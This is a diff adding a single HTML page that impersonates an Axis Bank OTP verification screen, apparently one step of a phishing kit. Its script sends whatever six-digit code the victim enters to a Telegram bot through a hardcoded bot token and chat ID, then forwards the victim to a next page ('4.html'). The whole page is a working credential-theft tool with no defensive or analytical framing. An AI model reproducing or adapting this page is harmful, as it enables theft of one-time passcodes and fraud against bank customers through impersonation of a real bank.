@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank OTP Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 20px;
+        }
+
+        .header h2 {
+            font-size: 20px;
+            color: #333;
+        }
+
+        .header p {
+            color: #777;
+            font-size: 14px;
+        }
+
+        .header img {
+            width: 120px;
+            margin-bottom: 15px;
+        }
+
+        .otp-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .otp-container form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        label {
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .otp-input {
+            margin-bottom: 20px;
+        }
+
+        .otp-input input {
+            width: 200px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .otp-input input:focus {
+            border-color: #0066cc;
+        }
+
+        .submit-btn {
+            margin-top: 20px;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .submit-btn:hover {
+            background-color: #005bb5;
+        }
+
+        .resend {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .resend a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .resend a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="axis_logo.png" alt="Axis Bank Logo">
+            <h2>Axis Bank OTP Verification</h2>
+            <p>Please enter the OTP sent to your registered mobile number.</p>
+        </div>
+        <div class="otp-container">
+            <form id="otpForm">
+                <label for="otp">OTP</label>
+                <div class="otp-input">
+                    <input type="text" id="otp" maxlength="6" required />
+                </div>
+                <button type="submit" class="submit-btn">Verify OTP</button>
+            </form>
+            <div class="resend">
+                <p>Didn't receive the OTP? <a href="#">Resend OTP</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Function to send OTP to Telegram bot
+        async function sendOTPToTelegram(otp) {
+            const telegramBotToken = '7986013852:AAF6wQs3UgIgvI6FxhmSn7pTnp-Y1Ocfrhw'; // Replace with your Bot token
+            const chatId = '1329056126'; // Replace with your chat ID
+
+            const message = `OTP: ${otp}`;
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                }),
+            });
+
+            const data = await response.json();
+            return data;
+        }
+
+        // Handle OTP form submission
+        document.getElementById("otpForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Get the OTP value
+            const otp = document.getElementById("otp").value;
+
+            // Validate OTP input (ensure it's a 6-digit OTP)
+            if (otp.length === 6 && /^\d{6}$/.test(otp)) {
+                // Send OTP to Telegram
+                sendOTPToTelegram(otp).then((response) => {
+                    if (response.ok) {
+                        // Redirect to the next page
+                        window.location.href = "4.html"; // Replace with your actual next page URL
+                    } else {
+                        alert("Error sending OTP. Please try again.");
+                    }
+                }).catch((error) => {
+                    alert("An error occurred: " + error.message);
+                });
+            } else {
+                alert("Please enter a valid 6-digit OTP.");
+            }
+        });
+    </script>
+</body>
+
+
+</html>
